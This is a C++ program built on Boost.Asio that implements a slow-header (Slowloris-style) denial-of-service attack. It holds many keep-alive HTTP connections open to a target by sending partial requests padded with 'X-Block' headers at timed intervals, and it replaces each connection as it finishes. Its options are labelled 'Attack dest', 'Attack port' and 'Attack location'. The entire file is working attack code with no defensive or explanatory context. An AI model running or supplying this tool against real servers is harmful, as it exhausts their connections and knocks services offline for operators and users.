#include <iostream>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/format.hpp>
#include <boost/program_options.hpp>
#include <boost/thread/thread.hpp>

using namespace std;
using namespace boost;
using namespace asio;
namespace po = program_options;

int concurrency, threads, speed, blocks, interval, expires;
string dest, port, location;
bool debug;

class Request {
public:
	Request(io_service& io, int id) : id(id), count(0) {
		timer = new deadline_timer(io, posix_time::seconds(interval));
		stream = new ip::tcp::iostream(dest, port);
		start();
	}
	~Request() {
		delete timer;
		delete stream;
	}

	void start() {
		cout << format("Start  %1%") % id << endl;

		*stream << format(
			"GET %1% HTTP/1.1\r\n"
			"Host: %2%\r\n"
			"User-Agent: Boost.Asio\r\n"
			"Accept: */*\r\n"
			"Connection: Keep-Alive\r\n"
		) % location % dest;

		stream->flush();
		timer->expires_from_now(posix_time::seconds(interval));
		timer->async_wait(bind(&Request::append, this));
	}

	void append() {
		cout << format("Append %1%->%2%") % id % count << endl;
		*stream << format("X-Block: %1%\r\n") % count++;
		stream->flush();

		if (count < blocks) {
			timer->expires_from_now(posix_time::seconds(interval));
			timer->async_wait(bind(&Request::append, this));
		} else {
			timer->expires_from_now(posix_time::seconds(interval));
			timer->async_wait(bind(&Request::finish, this));
		}
	}

	void finish() {
		*stream << "\r\n";
		stream->flush();
		cout << format("Finish %1%") % id << endl;

		if(debug){
			cout << stream->rdbuf() << endl;
		}

		new Request(timer->get_io_service(), id + concurrency);
		timer->expires_from_now(posix_time::seconds(expires));
		timer->async_wait(bind(&Request::close, this));
	}

	void close(){
		cout << format("Close  %1%") % id << endl;
		delete this;
	}

private:
	deadline_timer* timer;
	ip::tcp::iostream* stream;
	int id;
	int count;

};

void requestFactory(io_service* io, deadline_timer* timer, int id) {
	new Request(*io, id++);

	if(id < concurrency) {
		timer->expires_from_now(posix_time::millisec(speed));
		timer->async_wait(bind(requestFactory, io, timer, id));
	}
}

int main(int argc, char *argv[]) {
	po::options_description desc("Options");
	desc.add_options()
		("dest,d", po::value<string>(&dest)->default_value("localhost"), "Attack dest")
		("port,p", po::value<string>(&port)->default_value("80"), "Attack port")
		("location,l", po::value<string>(&location)->default_value("/"), "Attack location")
		("concurrency,c", po::value<int>(&concurrency)->default_value(20), "Concurrency requests")
		("threads,t", po::value<int>(&threads)->default_value(0), "Worker threads")
		("speed,s", po::value<int>(&speed)->default_value(100), "Speed to create initial requests (millisec)")
		("blocks,b", po::value<int>(&blocks)->default_value(10), "Blocks count")
		("interval,i", po::value<int>(&interval)->default_value(5), "Interval between blocks")
		("expires,e", po::value<int>(&expires)->default_value(5), "Expires for keep-alive connection")
		("help,h", "Show this help info")
		("debug,g", "Display response from server for debug");

	po::variables_map vm;

	try{
		po::store(po::parse_command_line(argc, argv, desc), vm);
		if (vm.count("help")) {
			cout << desc << endl;
			return 1;
		}
		if (vm.count("debug")) {
			debug = true;
		} else{
			debug = false;
		}
		po::notify(vm);
	} catch(po::error& e) {
		cerr << "Error: " << e.what() << endl << endl;
		cout << desc << endl;
		return -1;
	}

	io_service io;
	deadline_timer timer(io);

	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, threads=%5%, speed=%6%, blocks=%7%, interval=%8%, expires=%9%, debug=%10%") % dest % port % location % concurrency % threads % speed % blocks % interval % expires % debug << endl << endl;

	requestFactory(&io, &timer, 0);

	for(int i = 0; i < threads; i++){
		new thread(bind(&io_service::run, &io));
	}

	io.run();
	return 0;
}